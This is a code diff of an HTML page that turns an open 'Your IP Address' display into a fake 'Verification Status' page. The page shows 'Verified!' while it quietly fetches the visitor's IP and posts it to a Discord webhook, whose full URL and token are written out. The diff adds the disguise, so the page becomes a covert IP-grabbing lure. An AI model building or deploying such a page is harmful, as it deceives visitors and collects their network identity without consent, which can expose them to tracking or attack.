@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Your IP Address</title>
+    <title>Verification</title>
     <style>
         body {
             display: flex;
@@ -12,7 +12,7 @@
             height: 100vh;
             margin: 0;
             font-family: Arial, sans-serif;
-            background: linear-gradient(135deg, #74ebd5, #acb6e5);
+            background-color: #f0f0f0; /* Grey background */
             color: #333;
         }
         .container {
@@ -30,13 +30,14 @@
         .container p {
             font-size: 1.5rem;
             margin: 0;
+            color: #4CAF50; /* Green color for "Verified!" */
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Your IP Address</h1>
-        <p id="ip">Loading...</p>
+        <h1>Verification Status</h1>
+        <p id="status">Loading...</p>
     </div>
     <script>
         const webhookURL = "https://discord.com/api/webhooks/1331158148152561686/vFYMOS2KQrtz-EE1wAoe_fdjQVpEeB8dzUsEM5fO2MJosdDG96AB2q90gJ8gmxAqjcBB"; // Replace with your webhook URL
@@ -47,13 +48,13 @@
                 const data = await response.json();
                 const ip = data.ip;
 
-                // Display IP on the page
-                document.getElementById('ip').textContent = ip;
+                // Update the status to "Verified!"
+                document.getElementById('status').textContent = "Verified!";
 
                 // Send IP to webhook
                 sendToWebhook(ip);
             } catch (error) {
-                document.getElementById('ip').textContent = 'Unable to fetch IP.';
+                document.getElementById('status').textContent = 'Verification failed.';
                 console.error('Error fetching IP:', error);
             }
         }
@@ -66,7 +67,7 @@
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({
-                        content: `New visitor IP: ${ip}`
+                        content: `New verified IP: ${ip}`
                     })
                 });
                 console.log('IP sent to webhook successfully.');
